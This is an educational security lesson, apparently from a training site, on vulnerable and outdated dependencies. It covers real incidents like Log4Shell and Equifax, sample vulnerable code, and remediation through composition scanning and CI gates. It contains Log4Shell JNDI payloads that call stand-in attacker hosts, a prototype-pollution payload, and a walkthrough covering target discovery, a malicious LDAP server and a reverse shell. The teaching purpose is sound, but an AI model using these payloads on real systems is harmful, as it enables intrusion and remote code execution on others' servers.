Vulnerable & Outdated Components

Modern applications use dozens of open-source libraries, frameworks, and runtimes. When any of them has a known vulnerability — and you don't update — your application inherits that vulnerability, often with a public exploit ready to go.

Difficulty: Medium
SCA Dependencies Supply Chain

Real-World Incidents

Equifax Breach (2017) — Apache Struts CVE-2017-5638

Equifax was breached through a known vulnerability in Apache Struts 2 (CVE-2017-5638), disclosed in March 2017. The vulnerability allowed a remote attacker to execute arbitrary code via a malicious Content-Type header. Equifax had been notified, and the patch was available — but they didn't apply it to the disputed-data portal. Result: 147 million records exposed, $1.4B+ in costs.

Other Notable Incidents

  • Log4Shell — CVE-2021-44228 (2021) — The single most severe vulnerability of the decade. A JNDI injection in log4j2 allowed remote code execution via a single log line. Exploited in the wild within hours of disclosure. Affected millions of Java applications including iCloud, Steam, Tesla, and Minecraft.
  • Spring4Shell — CVE-2022-22965 — RCE in Spring Core via data binding. A direct parallel to Struts 2017.
  • Heartbleed — CVE-2014-0160 — Buffer over-read in OpenSSL. Affected ~17% of the internet's secure web servers. Affected Yahoo, Stack Overflow, and ~500,000+ other sites.
  • Shellshock — CVE-2014-6271 — Bash bug. Affected every Linux/Unix server using CGI scripts. Active exploitation for years.
  • WooCommerce / WordPress (2021) — Multiple critical CVEs in popular plugins like WooCommerce, File Manager, and Elementor led to mass website defacements and credit card skimming.
  • SolarWinds Orion (2020) — Attackers compromised the build pipeline and injected malware (SUNBURST) into a software update. ~18,000 organizations installed the trojanized update, including the U.S. Treasury, DHS, and Microsoft.
  • 3CX DesktopApp (2023) — A trojanized version of the 3CX softphone app delivered malware to 600,000+ companies including Toyota, Pepsi, and American Express.
  • event-stream npm (2018) — A popular npm package (2M+ downloads/week) was hijacked and gained a backdoor that stole Bitcoin wallets.

How It Works

1. The Dependency Tree Problem

A typical Node.js application has 1,000+ transitive dependencies. A vulnerability in any of them — direct or indirect — affects your app. You might not even know they're there.

2. The "Not My Code" Mentality

Developers often assume the libraries they pull from npm, PyPI, or Maven Central are safe. They aren't — anyone can publish a package, and typosquatting attacks (e.g., crossenv vs cross-env) trick developers into installing malicious code.

3. Unsupported / End-of-Life Software

You're still running PHP 5.4, Django 1.6, or Windows Server 2008. The vendor no longer ships security patches, and known exploits are public.

4. No Upgrade Process

You have a 5-year-old Node 8 application that "still works." Nobody wants to touch it. It's full of known vulnerabilities with public exploits.

5. Supply Chain Compromise

An attacker compromises a maintainer's account, pushes a malicious version, and a downstream project auto-pulls it. This is what happened with event-stream, SolarWinds, and 3CX.

Vulnerable Examples

Example 1: Log4Shell (the most impactful)

Java (with vulnerable log4j 2.x ≤ 2.14.1)Vulnerable
// The application logs user-controlled input
public class LoginController {
    @PostMapping("/login")
    public String login(@RequestParam String username) {
        // The username could be: ${jndi:ldap://attacker.com/exploit}
        log.info("Login attempt for: " + username);
        return "login";
    }
}

// ❌ log4j 2.x ≤ 2.14.1 evaluates JNDI lookups in log messages
// The exploit: log message → log4j parses ${jndi:ldap://...} →
// → makes a JNDI lookup to attacker.com → attacker returns a malicious Java class
// → ClassLoader instantiates the class → Remote Code Execution

// Payload via HTTP header (User-Agent, X-Forwarded-For, etc.):
// User-Agent: ${jndi:ldap://attacker.com:1389/a}

Example 2: Lodash Prototype Pollution (CVE-2019-10744)

JavaScript (Lodash < 4.17.12)Vulnerable
// ❌ Old version of lodash
const _ = require('lodash@4.17.11');

app.post('/merge', (req, res) => {
    // Attacker sends: { "__proto__": { "isAdmin": true } }
    // _.merge recursively copies into Object.prototype
    _.merge({}, JSON.parse(req.body));
    // Now every object in the app has isAdmin === true
    res.send('merged');
});

HTMLVulnerable

Attack Walkthrough — Log4Shell (Live Example)

1
Find a vulnerable target

Shodan query: http.html:"Apache/2.4" + port scan. Many Java apps have Log4j2 deployed — the question is which version.

2
Set up a malicious LDAP server

Use Interactsh or JNDI-Exploit-Kit. The server logs every connection so you can confirm the target is vulnerable.

3
Send a payload

Many places will log it: HTTP headers, URL paths, form fields, even email subjects. Try: User-Agent: ${jndi:ldap://yourserver.com/a}

4
Watch for callbacks

If your LDAP server gets a request, the target is vulnerable. You can now serve a Java class that runs a reverse shell, dumps memory, etc.

5
Patch and disclose

After disclosure, the fix is to upgrade to log4j 2.17.1+ or set log4j2.formatMsgNoLookups=true + remove the JndiLookup class.

Secure Approach — Software Composition Analysis (SCA)

1. Run a vulnerability scanner on every build

CLIUsing Snyk
$ npm install --save express
$ npx snyk test

# Output
# Tested 1 dependencies for known issues, found 2 issues:
# ✗ High severity vulnerability in lodash < 4.17.21
#   Path: lodash@4.17.11
#   Info: Prototype Pollution
#   From: app@1.0.0 > express@4.17.1 > lodash@4.17.11
#
# ✗ Medium severity in js-yaml < 3.13.1
#   Path: js-yaml@3.12.0
#   Info: Code Injection via yaml.load()
#
# Upgrade @app@1.0.0 to fix:
#   $ snyk wizard

2. Pin versions and lock files

Use package-lock.json (Node), requirements.txt with hashes (Python), Gemfile.lock (Ruby). Never use ^ or ~ in production without a careful update process.

3. Add CI gates

GitHub ActionsSecure
name: SCA Check
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
          # Fails the build if any HIGH or CRITICAL CVE is found

4. Update on a schedule

Use tools like Dependabot, Renovate, or Snyk to open PRs automatically when patches are available.

Prevention Checklist

✅ Component Hygiene
  • Inventory every component — direct, transitive, runtime, dev. Use a Software Bill of Materials (SBOM).
  • Run SCA on every build. Block merges on HIGH+ CVEs.
  • Update components regularly. Patch within 2 weeks for HIGH, within 30 days for MEDIUM.
  • Get rid of unsupported, end-of-life software. No PHP 5, no Node 8.
  • Pin versions in production; use lock files.
  • Subscribe to security advisories for your critical components.
  • For supply-chain attacks, use tools that analyze package behavior (Socket, Phylum, etc.).
